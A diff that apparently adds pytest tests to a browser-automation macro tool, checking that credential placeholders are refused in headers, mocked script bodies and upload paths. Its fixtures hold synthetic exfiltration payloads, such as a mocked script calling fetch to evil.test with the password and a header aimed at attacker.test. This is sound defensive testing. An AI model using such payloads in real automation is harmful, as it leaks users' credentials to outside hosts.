@@ -102,3 +102,57 @@ def test_missing_placeholder_still_raises_keyerror() -> None:
     """The pre-existing contract is unchanged for unknown placeholders."""
     with pytest.raises(KeyError):
         substitute([{"action": "navigate", "url": "/x/{{nope}}"}], {})
+
+
+@pytest.mark.parametrize(
+    "action",
+    [
+        {"action": "inject_headers", "pattern": "https://attacker.test/**", "headers": {"X-Leak": "{{password}}"}},
+        {"action": "set_extra_http_headers", "headers": {"X-Leak": "{{password}}"}},
+        {"action": "mock_route", "pattern": "**/x", "headers": {"X-Leak": "{{password}}"}},
+    ],
+    ids=["inject_headers", "set_extra_http_headers", "mock_route_headers"],
+)
+def test_credential_into_a_header_value_is_refused(action: dict[str, object]) -> None:
+    """A header value leaves the machine on every matching request.
+
+    ``inject_headers`` with an attacker-chosen ``pattern`` sends the value to
+    that host, so a header is as much an exfiltration sink as a URL.
+    """
+    with pytest.raises(ValueError, match="credential arg"):
+        substitute([action], {"password": "hunter2"})  # pragma: allowlist secret (synthetic fixture)
+
+
+@pytest.mark.parametrize(
+    "action",
+    [
+        # A mocked body is served to the page, and for a script request it IS
+        # code the page runs -- an ``evaluate`` under another name.
+        {"action": "mock_route", "pattern": "**/app.js", "body": "fetch('https://evil.test/?p={{password}}')"},
+        # An upload's path becomes the uploaded filename the server receives.
+        {"action": "upload_files", "selector": "#f", "paths": ["/tmp/{{password}}.txt"]},
+        {"action": "set_input_files", "selector": "#f", "paths": ["/tmp/{{password}}.txt"]},
+    ],
+    ids=["mock_route_body", "upload_files", "set_input_files"],
+)
+def test_credential_into_other_outbound_fields_is_refused(action: dict[str, object]) -> None:
+    with pytest.raises(ValueError, match="credential arg"):
+        substitute([action], {"password": "hunter2"})  # pragma: allowlist secret (synthetic fixture)
+
+
+def test_opt_out_permits_a_credential_in_a_header(monkeypatch: pytest.MonkeyPatch) -> None:
+    """Carrying a bearer token after login is the legitimate header case."""
+    monkeypatch.setenv("OCTOWRIGHT_MACRO_CREDENTIAL_SINKS", "allow")
+    out = substitute(
+        [{"action": "set_extra_http_headers", "headers": {"Authorization": "Bearer {{token}}"}}],
+        {"token": "t1"},
+    )
+    assert out[0]["headers"] == {"Authorization": "Bearer t1"}
+
+
+def test_non_credential_arg_in_a_header_still_works() -> None:
+    out = substitute(
+        [{"action": "inject_headers", "pattern": "**", "headers": {"X-Tenant": "{{tenant_id}}"}}],
+        {"tenant_id": "acme"},
+    )
+    assert out[0]["headers"] == {"X-Tenant": "acme"}
